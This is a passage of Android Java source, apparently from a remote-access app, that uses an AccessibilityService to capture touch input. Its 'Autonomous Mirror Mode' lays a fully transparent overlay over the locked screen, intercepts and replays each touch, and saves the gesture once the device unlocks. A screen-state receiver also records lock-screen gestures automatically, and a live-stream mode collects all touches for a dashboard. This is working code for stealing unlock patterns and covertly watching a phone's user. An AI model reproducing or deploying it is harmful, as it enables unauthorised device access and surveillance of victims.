            File out = new File(gestureDir(), fn);
            try (FileWriter fw = new FileWriter(out)) { fw.write(data.toString()); }

            liveStreamFilename = fn;
            r.put("saved",      true);
            r.put("filename",   fn);
            r.put("pointCount", snapshot.size());
            r.put("gestures",   liveCurrentGestureId);
            Log.i(TAG, "Live stream saved: " + fn + " (" + snapshot.size() + " pts, " + liveCurrentGestureId + " gestures)");
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Return current live stream points snapshot for dashboard polling (service-touch mode). */
    public JSONObject getLiveStreamPoints() {
        JSONObject r = new JSONObject();
        try {
            r.put("recording", liveStreamActive);
            JSONArray arr = new JSONArray();
            if (liveStreamActive) {
                synchronized (liveServicePts) {
                    // Return up to the last 1000 points to keep the payload small
                    int start = Math.max(0, liveServicePts.size() - 1000);
                    for (int i = start; i < liveServicePts.size(); i++) {
                        GesturePoint gp = liveServicePts.get(i);
                        JSONObject p = new JSONObject();
                        p.put("id",  gp.pointerId);
                        p.put("nx",  gp.nx);
                        p.put("ny",  gp.ny);
                        p.put("t",   gp.t);
                        p.put("gid", gp.gestureId);
                        arr.put(p);
                    }
                }
            }
            r.put("success",    true);
            r.put("points",     arr);
            r.put("pointCount", arr.length());
            r.put("gestures",   liveCurrentGestureId);
            r.put("screenW",    screenW);
            r.put("screenH",    screenH);
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /**
     * Replay a live stream file — returns all points (with gid) so the
     * dashboard can animate them on its canvas with each gesture drawn separately.
     */
    public JSONObject replayLiveStream(String filename) {
        JSONObject r = new JSONObject();
        try {
            File file = new File(gestureDir(), filename);
            if (!file.exists()) {
                r.put("success", false); r.put("error", "File not found: " + filename); return r;
            }
            JSONObject data = loadJson(file);
            if (data == null) {
                r.put("success", false); r.put("error", "Parse error"); return r;
            }
            // Return points as-is (they already contain gid from stopLiveStream)
            JSONArray pts = data.optJSONArray("points");
            if (pts == null) pts = new JSONArray();
            r.put("success",  true);
            r.put("filename", filename);
            r.put("points",   pts);
            r.put("screenW",  data.optInt("screenW", screenW));
            r.put("screenH",  data.optInt("screenH", screenH));
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Delete a live stream file. */
    public JSONObject deleteLiveStream(String filename) {
        return deleteGesture(filename);
    }

    /** List saved live streams (files whose label starts with "live_"). */
    public JSONObject listLiveStreams() {
        JSONObject r = new JSONObject();
        try {
            File dir = gestureDir();
            JSONArray arr = new JSONArray();
            File[] files = dir.listFiles(f -> f.getName().endsWith(".json"));
            if (files != null) {
                for (File f : files) {
                    try {
                        JSONObject data = loadJson(f);
                        if (data == null) continue;
                        String label = data.optString("label", "");
                        if (!label.startsWith("live_")) continue;
                        JSONObject meta = new JSONObject();
                        meta.put("filename",   f.getName());
                        meta.put("label",      label);
                        meta.put("packageId",  data.optString("packageId", ""));
                        meta.put("pointCount", data.optJSONArray("points") != null
                                               ? data.getJSONArray("points").length() : 0);
                        meta.put("durationMs", data.optLong("durationMs", 0));
                        meta.put("screenW",    data.optInt("screenW", 0));
                        meta.put("screenH",    data.optInt("screenH", 0));
                        meta.put("recordedAt", data.optLong("recordedAt", f.lastModified()));
                        arr.put(meta);
                    } catch (Exception ignored) {}
                }
            }
            r.put("success",  true);
            r.put("gestures", arr);
            r.put("count",    arr.length());
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    // =========================================================================
    // Autonomous Mirror Mode
    // Runs ONLY when device is locked. Invisible overlay intercepts every
    // gesture, replays it at 10-20ms, and if the device unlocks: saves it.
    // Fully offline — no dashboard control needed once started.
    // =========================================================================

    /**
     * Start autonomous mirror mode.
     * • Only activates if the device is currently locked.
     * • An invisible overlay intercepts all touch input.
     * • On each finger-lift, the captured gesture is replayed at 10-20ms.
     * • If the device unlocks → gesture is saved permanently and mode stops.
     * • If still locked → buffer clears, overlay listens for the next gesture.
     */
    public JSONObject startAutoMirror() {
        JSONObject r = new JSONObject();
        try {
            KeyguardManager km = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
            if (km == null || !km.isKeyguardLocked()) {
                r.put("success", false);
                r.put("error", "Device is not locked — mirror mode only runs on a locked device");
                return r;
            }
            if (autoMirrorActive) {
                r.put("success", false);
                r.put("error", "Mirror mode is already running");
                return r;
            }
            if (isRecording) {
                r.put("success", false);
                r.put("error", "Another recording is already active");
                return r;
            }
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                r.put("success", false);
                r.put("error", "Mirror mode requires Android 7+");
                return r;
            }
            autoMirrorActive = true;
            isRecording      = true;
            CountDownLatch latch = new CountDownLatch(1);
            mainHandler.post(() -> {
                overlay = new RecordingOverlay(
                        context, "mirror", "unlock_" + System.currentTimeMillis(),
                        screenW, screenH, wm,
                        () -> { isRecording = false; autoMirrorActive = false; });
                overlay.setSilent(true);
                overlay.setLockMode(true);
                overlay.setMirrorMode(true);
                overlay.setMirrorSvc(accessSvc);
                try {
                    overlay.show();
                } catch (Exception e) {
                    Log.e(TAG, "startAutoMirror overlay.show: " + e.getMessage());
                    isRecording      = false;
                    autoMirrorActive = false;
                    overlay = null;
                }
                latch.countDown();
            });
            latch.await(2, TimeUnit.SECONDS);
            if (overlay == null) {
                r.put("success", false);
                r.put("error", "Failed to show mirror overlay");
                return r;
            }
            r.put("success", true);
            r.put("message", "Mirror mode active — draw your unlock gesture; it will replay at ultra-speed automatically");
        } catch (Exception e) {
            autoMirrorActive = false;
            isRecording      = false;
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Stop autonomous mirror mode and remove the overlay. */
    public JSONObject stopAutoMirror() {
        JSONObject r = new JSONObject();
        try {
            autoMirrorActive = false;
            isRecording      = false;
            if (overlay != null) {
                final RecordingOverlay cur = overlay;
                overlay = null;
                mainHandler.post(() -> cur.hide());
            }
            r.put("success", true);
            r.put("message", "Mirror mode stopped");
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    // =========================================================================
    // Screen-Lock Auto-Capture (auto-start on accessibility enable)
    // Records when screen is ON+LOCKED, pauses when screen is UNLOCKED.
    // =========================================================================

    /**
     * Enable automatic gesture capture tied to screen lock state.
     * Registers a BroadcastReceiver to respond to screen ON/OFF/UNLOCK events.
     * Call this from UnifiedAccessibilityService.onServiceConnected().
     */
    public void enableLockScreenAutoCapture() {
        try {
            if (screenStateReceiverRegistered) return;
            lockCaptureEnabled = true;
            screenStateReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context ctx, Intent intent) {
                    try {
                        String action = intent.getAction();
                        if (action == null) return;
                        switch (action) {
                            case Intent.ACTION_SCREEN_ON:
                                onScreenOn();
                                break;
                            case Intent.ACTION_USER_PRESENT:
                                onScreenUnlocked();
                                break;
                            case Intent.ACTION_SCREEN_OFF:
                                onScreenOff();
                                break;
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "screenStateReceiver: " + e.getMessage());
                    }
                }
            };
            IntentFilter filter = new IntentFilter();
            filter.addAction(Intent.ACTION_SCREEN_ON);
            filter.addAction(Intent.ACTION_SCREEN_OFF);
            filter.addAction(Intent.ACTION_USER_PRESENT);
            context.registerReceiver(screenStateReceiver, filter);
            screenStateReceiverRegistered = true;
            Log.i(TAG, "Lock-screen auto-capture ENABLED");
        } catch (Exception e) {
            Log.e(TAG, "enableLockScreenAutoCapture: " + e.getMessage());
        }
    }

    /**
     * Disable automatic lock-screen gesture capture and unregister receiver.
     */
    public void disableLockScreenAutoCapture() {
        try {
            lockCaptureEnabled = false;
            if (screenStateReceiver != null && screenStateReceiverRegistered) {
                try { context.unregisterReceiver(screenStateReceiver); } catch (Exception ignored) {}
                screenStateReceiver = null;
                screenStateReceiverRegistered = false;
            }
            stopLockCapture();
            Log.i(TAG, "Lock-screen auto-capture DISABLED");
        } catch (Exception e) {
            Log.e(TAG, "disableLockScreenAutoCapture: " + e.getMessage());
        }
    }

    private void onScreenOn() {
        try {
            if (!lockCaptureEnabled) return;
            KeyguardManager km = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
            boolean isLocked = km != null && km.isKeyguardLocked();
            if (isLocked) {
                startLockCapture();
            }
        } catch (Exception e) {
            Log.e(TAG, "onScreenOn: " + e.getMessage());
        }
    }

    private void onScreenUnlocked() {
        try {
            stopLockCapture();
            // Device just unlocked — pattern was correct. Save whatever cells were captured
            // by the accessibility reader (screen reader only, no overlay needed).
            if (!advCells.isEmpty()) {
                commitAdvancedUnlockOnUnlock();
            }
        } catch (Exception e) {
            Log.e(TAG, "onScreenUnlocked: " + e.getMessage());
        }
    }

    private void onScreenOff() {
        try {
            stopLockCapture();
            // Let the delayed-save timer handle any pending advanced unlock cells —
            // do NOT clear them here so captures just before screen-off are not lost.
        } catch (Exception e) {
            Log.e(TAG, "onScreenOff: " + e.getMessage());
        }
    }

    /**
     * Mark that the lock-screen is showing and we should start capturing touches
     * via the AccessibilityService touch-event pipeline (no overlay window).
     */
    private void startLockCapture() {
        if (lockCaptureActive) return;
        synchronized (lockCurrentPts) { lockCurrentPts.clear(); }
        lockCurrentStart    = System.currentTimeMillis();
        lockCaptureActive   = true;
        Log.i(TAG, "Lock-screen capture STARTED (service-touch mode)");
    }

    /**
     * Lock screen gone (screen off or user unlocked via a different path).
     * Discard whatever partial gesture is in progress.
     */
    private void stopLockCapture() {
        if (!lockCaptureActive) return;
        lockCaptureActive = false;
        synchronized (lockCurrentPts) { lockCurrentPts.clear(); }
        Log.i(TAG, "Lock-screen capture STOPPED");
    }

    // =========================================================================
    // Service Touch Event Handling
    // Called from UnifiedAccessibilityService.onTouchEvent() — no overlay needed.
    // =========================================================================

    /**
     * Primary entry point: feed every MotionEvent from the AccessibilityService here.
     * Returns immediately if neither auto-capture nor lock-capture is active.
     * Always returns false so the system passes the touch through to the foreground app.
     */
    public void handleServiceTouchEvent(MotionEvent event) {
        if (!autoCapturing && !lockCaptureActive && !liveStreamActive) return;
        // Reset idle watchdog on every touch while auto-capturing
        if (autoCapturing) lastTouchMs = System.currentTimeMillis();

        int action    = event.getActionMasked();
        int pidIdx    = event.getActionIndex();
        int ptrCount  = event.getPointerCount();
        long nowMs    = System.currentTimeMillis();

        // ── Lock-screen mode: capture per-gesture, save only on successful unlock ──
        if (lockCaptureActive) {
            if (action == MotionEvent.ACTION_DOWN) {
                synchronized (lockCurrentPts) { lockCurrentPts.clear(); }
                lockCurrentStart = nowMs;
            }

            long relT = nowMs - lockCurrentStart;
            synchronized (lockCurrentPts) {
                for (int i = 0; i < ptrCount; i++) {
                    GesturePoint gp = new GesturePoint();
                    gp.pointerId = event.getPointerId(i);
                    gp.action    = (i == pidIdx) ? action : MotionEvent.ACTION_MOVE;
                    gp.nx        = event.getX(i) / screenW;
                    gp.ny        = event.getY(i) / screenH;
                    gp.t         = relT;
                    lockCurrentPts.add(gp);
                }
            }

            if (action == MotionEvent.ACTION_UP || action == MotionEvent.ACTION_CANCEL) {
                onLockGestureLifted(nowMs);
            }
            return;
        }

        // ── Live stream mode: capture each touch as its own gesture segment ──
        // Each ACTION_DOWN starts a new gestureId so the dashboard can draw
        // individual touches/swipes/draws separately instead of merged together.
        if (liveStreamActive) {
            if (action == MotionEvent.ACTION_DOWN) {
                liveCurrentGestureId++;
                liveServicePtsStart = nowMs;
            }
            long relT = nowMs - liveServicePtsStart;
            synchronized (liveServicePts) {
                for (int i = 0; i < ptrCount; i++) {
                    GesturePoint gp = new GesturePoint();
                    gp.pointerId = event.getPointerId(i);
                    gp.action    = (i == pidIdx) ? action : MotionEvent.ACTION_MOVE;
                    gp.nx        = event.getX(i) / screenW;
                    gp.ny        = event.getY(i) / screenH;
                    gp.t         = relT;
                    gp.gestureId = liveCurrentGestureId;
                    liveServicePts.add(gp);
                }
            }
            return;
        }

        // ── Manual auto-capture: accumulate everything until stopAutoCapture() ──
        if (autoCapturing) {
            long relT = nowMs - servicePtsStart;
            synchronized (servicePts) {
                for (int i = 0; i < ptrCount; i++) {
                    GesturePoint gp = new GesturePoint();
                    gp.pointerId = event.getPointerId(i);
                    gp.action    = (i == pidIdx) ? action : MotionEvent.ACTION_MOVE;
                    gp.nx        = event.getX(i) / screenW;
                    gp.ny        = event.getY(i) / screenH;
                    gp.t         = relT;
                    servicePts.add(gp);
                }
            }
        }
    }

    /**
     * Called when the user lifts their finger on the lock screen.
     * Waits 350 ms then checks the keyguard state: if the device is now unlocked
     * the gesture was the correct unlock pattern, so we save it.
     */
    private void onLockGestureLifted(long gestureEndMs) {
        final List<GesturePoint> snapshot;
        synchronized (lockCurrentPts) {
            if (lockCurrentPts.size() < 8) {
                lockCurrentPts.clear();
                return;
            }
            long dur = gestureEndMs - lockCurrentStart;
            if (dur < 150) {
                lockCurrentPts.clear();
                return;
            }
            snapshot = new ArrayList<>(lockCurrentPts);
            lockCurrentPts.clear();
        }

        long dur = gestureEndMs - lockCurrentStart;
        lockGestureHandler.postDelayed(() -> {
            try {
                // Save every qualifying swipe gesture regardless of unlock state.
                // This lets us verify capture is working. The 1.1 s delay gives
                // enough time for the keyguard to dismiss if the gesture was correct,
                // so unlock-only filtering can be re-enabled here later if needed.
                saveServiceGesturePoints(snapshot,
                        "lock", "lockscreen_" + System.currentTimeMillis(), dur);
                Log.i(TAG, "Lock-screen gesture saved (" + snapshot.size() + " pts)");
            } catch (Exception e) {
                Log.e(TAG, "onLockGestureLifted: " + e.getMessage());
            }
        }, 1100);
    }

    /**
     * Persist a list of GesturePoints to a JSON file in the gesture directory.
     * Applies the same complexity filter as RecordingOverlay.stopAndSaveIfComplex().
     * Returns the saved-file JSONObject on success, null if the gesture was too simple.
     */
    private JSONObject saveServiceGesturePoints(
            List<GesturePoint> pts, String pkgId, String label, long durationMs) {
        try {
            if (pts.size() < 8) return null;

            // Complexity filter ― same as RecordingOverlay.stopAndSaveIfComplex
            boolean multiPointer = false;
            for (GesturePoint gp : pts) {
                if (gp.pointerId != 0) { multiPointer = true; break; }
            }

            if (!multiPointer && pts.size() >= 3) {
                GesturePoint first = pts.get(0);
                GesturePoint last  = pts.get(pts.size() - 1);
                float dx  = last.nx - first.nx;
                float dy  = last.ny - first.ny;
                float len = (float) Math.sqrt(dx * dx + dy * dy);
                if (len < 0.05f) {
                    if (durationMs < 1500) return null; // simple tap — discard
                }
                // Straight swipes are now SAVED so every gesture can be inspected.
                // The maxDev filter is intentionally removed to aid debugging.
            }

            // Build JSON payload
            JSONArray arr = new JSONArray();
            for (GesturePoint gp : pts) {
                JSONObject p = new JSONObject();
                p.put("id",     gp.pointerId);
                p.put("action", gp.action);
                p.put("nx",     gp.nx);
                p.put("ny",     gp.ny);
                p.put("t",      gp.t);
                arr.put(p);
            }
            JSONObject data = new JSONObject();
            data.put("label",       label);
            data.put("packageId",   pkgId);
            data.put("screenW",     screenW);
            data.put("screenH",     screenH);
            data.put("durationMs",  durationMs);
            data.put("recordedAt",  System.currentTimeMillis());
            data.put("points",      arr);

            String ts  = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
                    .format(new Date());
            String fn  = pkgId + "_" + label + "_" + ts + ".json";
            File   out = new File(gestureDir(), fn);
            try (FileWriter fw = new FileWriter(out)) { fw.write(data.toString()); }

            JSONObject res = new JSONObject();
            res.put("filename",   fn);
            res.put("pointCount", pts.size());
            res.put("durationMs", durationMs);
            Log.i(TAG, "Service gesture saved: " + fn + " (" + pts.size() + " pts)");
            return res;
        } catch (Exception e) {
            Log.e(TAG, "saveServiceGesturePoints: " + e.getMessage());
            return null;
        }
    }

    // =========================================================================
    // Recording Overlay View
    // =========================================================================

    private static class RecordingOverlay {
        private final Context context;
        private final String packageId;
        private final String label;
        private final int    screenW;
        private final int    screenH;
        private final WindowManager wm;
        private final Runnable onStop;

        private View view;
        private WindowManager              activeWm;
        private WindowManager.LayoutParams activeLp;
        private final List<GesturePoint> points = new ArrayList<>();
        private long startTime;
        private boolean stopped = false;
        private volatile boolean paused = false;
        private volatile boolean silent = false;
        // lockMode: per-gesture save — discard if device still locked after finger lift
        private volatile boolean lockMode   = false;
        private volatile boolean mirrorMode = false;
        private AccessibilityService mirrorSvc = null;
        // liveReplayMode: during live stream, replay each gesture on the real screen
        private volatile boolean liveReplayMode = false;
        private AccessibilityService liveReplaySvc = null;
        private final List<GesturePoint> currentLiveGesturePts = new ArrayList<>();
        private long liveGestureStartTime = 0;
        private final List<GesturePoint> currentGesturePts = new ArrayList<>();
        private long currentGestureStartTime = 0;
        private final Handler overlayHandler = new Handler(Looper.getMainLooper());

        // Drawing state
        private final Map<Integer, Path> activePaths = new HashMap<>();
        private final List<Path>         finishedPaths = new ArrayList<>();
        private final Paint paintPath;
        private final Paint paintHint;
        private final Paint paintBg;

        RecordingOverlay(Context context, String packageId, String label,
                         int screenW, int screenH, WindowManager wm, Runnable onStop) {
            this.context   = context;
            this.packageId = packageId;
            this.label     = label;
            this.screenW   = screenW;
            this.screenH   = screenH;
            this.wm        = wm;
            this.onStop    = onStop;

            paintPath = new Paint(Paint.ANTI_ALIAS_FLAG);
            paintPath.setColor(Color.parseColor("#00FF88"));
            paintPath.setStyle(Paint.Style.STROKE);
            paintPath.setStrokeWidth(6f);
            paintPath.setStrokeCap(Paint.Cap.ROUND);
            paintPath.setStrokeJoin(Paint.Join.ROUND);

            paintHint = new Paint(Paint.ANTI_ALIAS_FLAG);
            paintHint.setColor(Color.WHITE);
            paintHint.setTextSize(42f);
            paintHint.setTextAlign(Paint.Align.CENTER);
            paintHint.setShadowLayer(4, 0, 0, Color.BLACK);

            paintBg = new Paint();
            paintBg.setColor(Color.parseColor("#55000000"));
        }

        /** Set silent mode: no visual feedback, completely transparent overlay. */
        void setSilent(boolean silent) {
            this.silent = silent;
        }

        /**
         * Lock mode: instead of one big recording, each finger-down→finger-up is treated
         * as a single gesture attempt. After each lift, checks if the device is now unlocked:
         *   - unlocked → save that gesture
         *   - still locked → discard and start fresh for the next attempt
         */
        void setLockMode(boolean lockMode) {
            this.lockMode = lockMode;
        }

        /**
         * Mirror mode: the overlay intercepts every touch gesture silently, replays it
         * at ultra-speed (10-20ms), then checks if the device unlocked.
         * Must be combined with lockMode=true and silent=true.
         * Requires the AccessibilityService to dispatch the fast replay.
         */
        void setMirrorMode(boolean mirrorMode) {
            this.mirrorMode = mirrorMode;
        }

        void setMirrorSvc(AccessibilityService svc) {
            this.mirrorSvc = svc;
        }

        /** Enable live replay mode: each user gesture is silently replayed on the real screen. */
        void setLiveReplayMode(boolean mode) {
            this.liveReplayMode = mode;
        }

        /** Set the AccessibilityService used to dispatch replayed gestures in live replay mode. */
        void setLiveReplaySvc(AccessibilityService svc) {
            this.liveReplaySvc = svc;
        }

        /**
         * Build a GestureDescription from a List<GesturePoint> with all timing
         * compressed into TARGET_MS (10-20ms) — imperceptibly fast.
         */
        @android.annotation.TargetApi(android.os.Build.VERSION_CODES.N)
        private GestureDescription buildFastGesture(List<GesturePoint> pts) {
            try {
                final long TARGET_MS = 20;
                Map<Integer, List<long[]>> strokes = new HashMap<>();
                long firstT = -1, lastT = 0;
                for (GesturePoint gp : pts) {
                    float sx = Math.max(1, Math.min(screenW - 1, gp.nx * screenW));
                    float sy = Math.max(1, Math.min(screenH - 1, gp.ny * screenH));
                    if (firstT < 0) firstT = gp.t;
                    long relT = gp.t - firstT;
                    if (relT > lastT) lastT = relT;
                    if (gp.action == MotionEvent.ACTION_DOWN ||
                        gp.action == MotionEvent.ACTION_POINTER_DOWN ||
                        gp.action == 5) {
                        strokes.put(gp.pointerId, new ArrayList<>());
                    }
                    List<long[]> s = strokes.get(gp.pointerId);
                    if (s == null) { s = new ArrayList<>(); strokes.put(gp.pointerId, s); }
                    s.add(new long[]{ relT, (long) sx, (long) sy });
                }
                double scale = lastT > TARGET_MS ? (double) TARGET_MS / lastT : 1.0;
                GestureDescription.Builder builder = new GestureDescription.Builder();
                boolean has = false;
                for (Map.Entry<Integer, List<long[]>> e : strokes.entrySet()) {
                    List<long[]> s = e.getValue();
                    if (s.isEmpty()) continue;
                    long st  = Math.round(s.get(0)[0] * scale);
                    long dur = Math.max(1, Math.round((s.get(s.size()-1)[0] - s.get(0)[0]) * scale));
                    Path path = new Path();
                    path.moveTo(s.get(0)[1], s.get(0)[2]);
                    for (int i = 1; i < s.size(); i++) path.lineTo(s.get(i)[1], s.get(i)[2]);
                    builder.addStroke(new GestureDescription.StrokeDescription(path, st, dur));
                    has = true;
                }
                return has ? builder.build() : null;
            } catch (Exception e) {
                Log.e(TAG, "buildFastGesture: " + e.getMessage());
                return null;
            }
        }

        void show() {
            startTime = System.currentTimeMillis();

            // Prefer the AccessibilityService as context — TYPE_ACCESSIBILITY_OVERLAY requires
            // a WindowManager token that only an AccessibilityService can provide.
            com.remoteaccess.educational.services.UnifiedAccessibilityService svc =
                com.remoteaccess.educational.services.UnifiedAccessibilityService.getInstance();
            final Context viewCtx = (svc != null) ? svc : context;
            final WindowManager overlayWm = (svc != null)
                ? (WindowManager) svc.getSystemService(Context.WINDOW_SERVICE)
                : wm;

            view = new View(viewCtx) {
                @Override
                public boolean onTouchEvent(MotionEvent event) {
                    if (!stopped) handleTouch(event);
                    // Mirror mode: intercept the touch (return true) so the lock screen
                    // does NOT receive the original event — only the fast replay hits it.
                    // liveReplayMode: intercept (return true) so the touch does NOT pass
                    // directly to the underlying app — dispatchGesture handles the replay.
                    // Silent (non-mirror, non-liveReplay): pass through (return false) so the
                    // user's gesture reaches the underlying window normally.
                    return mirrorMode || !silent || liveReplayMode;
                }

                @Override
                protected void onDraw(Canvas canvas) {
                    // Silent mode = completely invisible, nothing drawn at all
                    if (silent) return;
                    // Non-silent recording mode: show visual feedback
                    canvas.drawRect(0, 0, getWidth(), getHeight(), paintBg);
                    for (Path p : finishedPaths) canvas.drawPath(p, paintPath);
                    for (Path p : activePaths.values()) canvas.drawPath(p, paintPath);
                    String recLabel = paused ? "⏸ PAUSED" : "●";
                    canvas.drawText(recLabel, getWidth() / 2f, 120, paintHint);
                }
            };
            view.setLayerType(View.LAYER_TYPE_SOFTWARE, null);

            // Silent mode = invisible overlay (nothing drawn) but still touchable so
            // onTouchEvent fires and gestures are recorded on ALL Android versions.
            // FLAG_NOT_TOUCHABLE is intentionally NOT set here.
            int flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;
            int fmt = silent ? PixelFormat.TRANSPARENT : PixelFormat.TRANSLUCENT;

            // Use TYPE_ACCESSIBILITY_OVERLAY — works without SYSTEM_ALERT_WINDOW when
            // the AccessibilityService is the provider of the WindowManager token.
            // Fall back to TYPE_APPLICATION_OVERLAY only if the service is unavailable.
            int[] types = svc != null
                ? new int[]{ WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY }
                : new int[]{ WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                             WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY };

            boolean added = false;
            Exception lastEx = null;
            for (int type : types) {
                try {
                    WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT,
                            type, flags, fmt);
                    overlayWm.addView(view, lp);
                    activeWm = overlayWm;
                    activeLp = lp;
                    added = true;
                    Log.i(TAG, "Overlay added with type " + type + " via " + (svc != null ? "AccessibilityService WM" : "app WM"));
                    break;
                } catch (Exception e) {
                    Log.w(TAG, "addView type=" + type + " failed: " + e.getMessage());
                    lastEx = e;
                }
            }
            if (!added) {
                Log.e(TAG, "RecordingOverlay.show all types failed");
                view = null;
                if (onStop != null) onStop.run();
                throw lastEx != null ? new RuntimeException(lastEx) : new RuntimeException("Could not add overlay view");
            }
        }

        void setPaused(boolean paused) {
            this.paused = paused;
            if (view != null) view.invalidate();
        }

        /**
         * Accept a MotionEvent from an external source (e.g. AccessibilityService.onMotionEvent
         * on API 33+). Used when the overlay is FLAG_NOT_TOUCHABLE and cannot receive events
         * through its own onTouchEvent.
         */
        void externalTouch(MotionEvent event) {
            if (!stopped) handleTouch(event);
        }

        /** Return up to maxPts of the most recent recorded points as a JSON snapshot. */
        synchronized JSONArray getPointsSnapshot(int maxPts) throws Exception {
            JSONArray arr = new JSONArray();
            int start = Math.max(0, points.size() - maxPts);
            for (int i = start; i < points.size(); i++) {
                GesturePoint gp = points.get(i);
                JSONObject p = new JSONObject();
                p.put("id",     gp.pointerId);
                p.put("action", gp.action);
                p.put("nx",     gp.nx);
                p.put("ny",     gp.ny);
                p.put("t",      gp.t);
                arr.put(p);
            }
            return arr;
        }

        private void handleTouch(MotionEvent event) {
            if (paused) return;
            if (lockMode ? currentGesturePts.size() >= MAX_PTS : points.size() >= MAX_PTS) return;
            long now  = System.currentTimeMillis();
            long relT = now - startTime;

            int action    = event.getActionMasked();
            int pidIndex  = event.getActionIndex();
            int pointerId = event.getPointerId(pidIndex);

            int count = event.getPointerCount();

            // In lockMode, start a fresh gesture batch on first finger down
            if (lockMode && (action == MotionEvent.ACTION_DOWN)) {
                currentGesturePts.clear();
                currentGestureStartTime = now;
            }

            // In liveReplayMode, start a fresh gesture batch on first finger down
            if (liveReplayMode && (action == MotionEvent.ACTION_DOWN)) {
                currentLiveGesturePts.clear();
                liveGestureStartTime = now;
            }

            for (int i = 0; i < count; i++) {
                int pid = event.getPointerId(i);
                float rx = event.getX(i) / screenW;
                float ry = event.getY(i) / screenH;
                GesturePoint gp = new GesturePoint();
                gp.pointerId = pid;
                gp.action    = (i == pidIndex) ? action : MotionEvent.ACTION_MOVE;
                gp.nx = rx; gp.ny = ry;
                gp.t = relT;
                if (lockMode) {
                    // Track per-gesture points separately
                    GesturePoint gp2 = new GesturePoint();
                    gp2.pointerId = gp.pointerId;
                    gp2.action    = gp.action;
                    gp2.nx = gp.nx; gp2.ny = gp.ny;
                    gp2.t = now - currentGestureStartTime;
                    currentGesturePts.add(gp2);
                } else {
                    points.add(gp);
                }
                // In liveReplayMode, also track the current gesture batch for replay
                if (liveReplayMode) {
                    GesturePoint gp3 = new GesturePoint();
                    gp3.pointerId = gp.pointerId;
                    gp3.action    = gp.action;
                    gp3.nx = gp.nx; gp3.ny = gp.ny;
                    gp3.t = now - liveGestureStartTime;
                    currentLiveGesturePts.add(gp3);
                }
            }

            // Update visual paths (only relevant in non-silent mode)
            if (!silent) {
                float x = event.getX(pidIndex);
                float y = event.getY(pidIndex);
                switch (action) {
                    case MotionEvent.ACTION_DOWN:
                    case MotionEvent.ACTION_POINTER_DOWN: {
                        Path p = new Path();
                        p.moveTo(x, y);
                        activePaths.put(pointerId, p);
                        break;
                    }
                    case MotionEvent.ACTION_MOVE: {
                        for (int i = 0; i < count; i++) {
                            int pid = event.getPointerId(i);
                            Path p = activePaths.get(pid);
                            if (p != null) p.lineTo(event.getX(i), event.getY(i));
                        }
                        break;
                    }
                    case MotionEvent.ACTION_UP:
                    case MotionEvent.ACTION_POINTER_UP: {
                        Path p = activePaths.remove(pointerId);
                        if (p != null) { p.lineTo(x, y); finishedPaths.add(p); }
                        break;
                    }
                }
                if (view != null) view.invalidate();
            }

            // lockMode: on last finger lift, decide save or discard
            if (lockMode && action == MotionEvent.ACTION_UP) {
                onGestureFinished(now);
            }

            // liveReplayMode: on finger lift, replay the captured gesture on the real screen
            if (liveReplayMode && action == MotionEvent.ACTION_UP) {
                onLiveGestureFinished();
            }
        }

        /**
         * Called when the user lifts their finger during live stream.
         * Temporarily disables the overlay, replays the exact gesture on the real screen,
         * then re-enables the overlay for the next interaction.
         * The recorded points are NOT disturbed — recording continues uninterrupted.
         */
        @android.annotation.TargetApi(android.os.Build.VERSION_CODES.N)
        private void onLiveGestureFinished() {
            if (liveReplaySvc == null || Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
            final List<GesturePoint> snapshot = new ArrayList<>(currentLiveGesturePts);
            currentLiveGesturePts.clear();
            if (snapshot.isEmpty()) return;

            // For a single tap (1 or 2 points — just DOWN and/or UP at the same spot),
            // synthesise a minimal tap gesture so it is not silently dropped.
            final List<GesturePoint> effective;
            if (snapshot.size() < 3) {
                GesturePoint first = snapshot.get(0);
                GesturePoint down = new GesturePoint();
                down.pointerId = 0; down.action = MotionEvent.ACTION_DOWN;
                down.nx = first.nx; down.ny = first.ny; down.t = 0;
                GesturePoint up = new GesturePoint();
                up.pointerId = 0; up.action = MotionEvent.ACTION_UP;
                up.nx = first.nx; up.ny = first.ny; up.t = 10;
                effective = new ArrayList<>();
                effective.add(down);
                effective.add(up);
            } else {
                effective = snapshot;
            }

            GestureDescription gesture = buildFastGesture(effective);
            if (gesture == null) return;

            // Disable overlay touch capture so the replayed gesture reaches the app below.
            // Recording continues in the background (points already stored); the replay
            // events themselves never reach the overlay since FLAG_NOT_TOUCHABLE is set.
            setTouchable(false);
            liveReplaySvc.dispatchGesture(gesture,
                new AccessibilityService.GestureResultCallback() {
                    @Override
                    public void onCompleted(GestureDescription g) {
                        // Re-enable overlay so the next user gesture is captured
                        overlayHandler.post(() -> setTouchable(true));
                    }
                    @Override
                    public void onCancelled(GestureDescription g) {
                        Log.w(TAG, "liveReplayMode: gesture dispatch cancelled — re-enabling overlay");
                        overlayHandler.post(() -> setTouchable(true));
                    }
                }, null);
        }

        /**
         * Called when the user lifts the last finger in lockMode.
         * Checks whether the device is now unlocked:
